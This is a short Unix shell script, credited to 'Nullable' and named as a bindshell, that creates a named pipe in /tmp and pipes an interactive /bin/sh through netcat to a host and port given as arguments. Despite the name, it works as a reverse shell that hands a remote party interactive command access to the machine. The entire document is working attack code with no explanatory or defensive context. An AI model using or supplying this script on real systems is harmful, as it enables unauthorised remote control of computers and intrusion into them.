#! /bin/sh 

# author: Nullable

f_name="/tmp/bindshell_null"
trap "rm $f_name" EXIT

del_pipe () {
	if test -f $f_name; then rm $f_name; fi
}

main () {
	del_pipe
	mkfifo $f_name
	cat $f_name | /bin/sh -i 2>&1 | nc $1 $2 > $f_name
}

main $@
